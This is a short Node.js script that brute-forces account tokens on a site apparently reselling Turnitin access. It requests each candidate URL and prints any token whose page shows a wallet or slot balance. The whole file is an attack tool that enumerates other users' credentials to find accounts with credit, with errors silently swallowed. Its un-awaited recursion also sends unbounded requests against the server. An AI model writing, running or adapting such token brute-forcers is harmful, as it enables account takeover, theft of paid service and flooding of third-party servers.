const axios = require("axios")
const cheerio = require("cheerio")

const checkToken = async (token) => {
    try {
        const res = await axios.get(`https://turnitin.report/turnitin/ext/acc/${token}/`)
        const $ = cheerio.load(res.data);
        const text = $("#turnitin-slots-wallet").text();
        console.log(`${token}|${text ? text : "0"}`);
        return;
    }
    catch (err) {
    }

}

let letter = "abcdefghijklmnopqrstuvwxyz0123456789";
let generateToken = async (index, temp = "") => {
    if (index > 40) {
        await checkToken(temp);
    } else {
        for (let i = 0; i < letter.length; i++) {
            generateToken(index + 1, temp + letter.charAt(i));
        }
    }
}
console.log("runnig...");
generateToken(0);